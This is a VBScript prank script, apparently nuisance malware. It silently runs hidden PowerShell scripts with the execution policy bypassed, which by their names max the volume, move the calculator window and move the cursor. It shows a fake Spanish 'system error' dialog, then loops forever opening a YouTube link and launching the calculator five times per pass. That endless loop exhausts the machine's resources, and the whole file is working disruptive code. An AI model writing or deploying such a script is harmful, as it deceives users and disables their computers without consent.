Dim objShell
Set objShell = CreateObject("WScript.Shell")

Dim scriptPath
scriptPath = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".") & "\scripts\"

objShell.Run "powershell -ExecutionPolicy Bypass -File """ & scriptPath & "SetVolumeMax.ps1""", 0, False

objShell.Run "powershell -ExecutionPolicy Bypass -File """ & scriptPath & "MoveCalc.ps1""", 0, False
    
objShell.Run "powershell -ExecutionPolicy Bypass -File """ & scriptPath & "CursorMover.ps1""", 0, False

MsgBox "Mongo Instalado presiona OK para solucionar", 48, "Error en el sistema"

Do

    objShell.Run "https://youtu.be/1-el2OcwBfI"

    Dim i
    For i = 1 To 5
        objShell.Run "calc.exe"
    Next

Loop

Set objShell = Nothing
